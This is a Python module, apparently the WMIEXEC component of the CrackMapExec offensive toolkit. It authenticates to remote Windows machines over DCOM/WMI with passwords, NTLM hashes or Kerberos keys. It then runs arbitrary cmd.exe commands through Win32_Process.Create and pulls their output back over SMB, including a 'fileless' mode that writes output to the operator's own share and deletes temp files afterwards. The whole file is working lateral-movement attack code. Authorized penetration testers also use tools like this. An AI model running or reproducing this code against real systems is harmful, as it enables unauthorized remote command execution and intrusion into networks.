#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ntpath
import os
from time import sleep
from cme.helpers.misc import gen_random_string
from cme.logger import cme_logger
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL


class WMIEXEC:
    def __init__(
        self,
        target,
        share_name,
        username,
        password,
        domain,
        smbconnection,
        doKerberos=False,
        aesKey=None,
        kdcHost=None,
        hashes=None,
        share=None,
        logger=cme_logger,
        timeout=None
    ):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ""
        self.__nthash = ""
        self.__share = share
        self.__timeout = timeout
        self.__smbconnection = smbconnection
        self.__output = None
        self.__outputBuffer = b""
        self.__share_name = share_name
        self.__shell = "cmd.exe /Q /c "
        self.__pwd = "C:\\"
        self.__aesKey = aesKey
        self.__kdcHost = kdcHost
        self.__doKerberos = doKerberos
        self.__retOutput = True
        self.__stringBinding = ""
        self.logger = logger

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""
        self.__dcom = DCOMConnection(
            self.__target,
            self.__username,
            self.__password,
            self.__domain,
            self.__lmhash,
            self.__nthash,
            self.__aesKey,
            oxidResolver=True,
            doKerberos=self.__doKerberos,
            kdcHost=self.__kdcHost,
        )
        try:
            iInterface = self.__dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            self.firewall_check(iInterface, self.__timeout)
        except:
            self.__dcom.disconnect()
            self.__win32Process = None
            self.logger.fail(f'WMIEXEC: Dcom initialization failed on connection with stringbinding: "{self.__stringBinding}", please try "--wmiexec-timeout".')
        else:
            self.logger.info(f'WMIEXEC: Dcom initialization succeed on connection with stringbinding: "{self.__stringBinding}"')
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
            iWbemLevel1Login.RemRelease()
            self.__win32Process, _ = iWbemServices.GetObject("Win32_Process")

    def firewall_check(self, iInterface ,timeout):
        stringBindings = iInterface.get_cinstance().get_string_bindings()
        for strBinding in stringBindings:
            if strBinding['wTowerId'] == 7:
                if strBinding['aNetworkAddr'].find('[') >= 0:
                    binding, _, bindingPort = strBinding['aNetworkAddr'].partition('[')
                    bindingPort = '[' + bindingPort
                else:
                    binding = strBinding['aNetworkAddr']
                    bindingPort = ''

                if binding.upper().find(iInterface.get_target().upper()) >= 0:
                    stringBinding = 'ncacn_ip_tcp:' + strBinding['aNetworkAddr'][:-1]
                    break
                elif iInterface.is_fqdn() and binding.upper().find(iInterface.get_target().upper().partition('.')[0]) >= 0:
                    stringBinding = 'ncacn_ip_tcp:%s%s' % (iInterface.get_target(), bindingPort)
        
        self.__stringBinding = stringBinding
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.set_connect_timeout(timeout)
        rpctransport.connect()
        rpctransport.disconnect()

    def execute(self, command, output=False):
        if self.__win32Process is None:
            return False
        self.__retOutput = output
        if self.__retOutput:
            self.__smbconnection.setTimeout(100000)
        if os.path.isfile(command):
            with open(command) as commands:
                for c in commands:
                    self.execute_handler(c.strip())
        else:
            self.execute_handler(command)
        self.__dcom.disconnect()
        return self.__outputBuffer

    def cd(self, s):
        self.execute_remote("cd " + s)
        if len(self.__outputBuffer.strip("\r\n")) > 0:
            self.__outputBuffer = b""
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote("cd ")
            self.__pwd = self.__outputBuffer.strip("\r\n")
            self.__outputBuffer = b""

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_handler(self, data):
        if self.__retOutput:
            try:
                self.logger.debug("Executing remote")
                self.execute_remote(data)
            except:
                self.cd("\\")
                self.execute_remote(data)
        else:
            self.execute_remote(data)

    def execute_remote(self, data):
        self.__output = "\\Windows\\Temp\\" + gen_random_string(6)

        command = self.__shell + data
        if self.__retOutput:
            command += " 1> " + f"{self.__output}" + " 2>&1"

        self.logger.debug("Executing command: " + command)
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output_remote()

    def execute_fileless(self, data):
        self.__output = gen_random_string(6)
        local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]

        command = self.__shell + data + f" 1> \\\\{local_ip}\\{self.__share_name}\\{self.__output} 2>&1"

        self.logger.debug("Executing command: " + command)
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output_fileless()

    def get_output_fileless(self):
        while True:
            try:
                with open(os.path.join("/tmp", "cme_hosted", self.__output), "r") as output:
                    self.output_callback(output.read())
                break
            except IOError:
                sleep(2)

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ""
            return

        while True:
            try:
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                if str(e).find("STATUS_SHARING_VIOLATION") >= 0:
                    # Output not finished, let's wait
                    sleep(2)
                    pass
                else:
                    # print str(e)
                    pass

        self.__smbconnection.deleteFile(self.__share, self.__output)
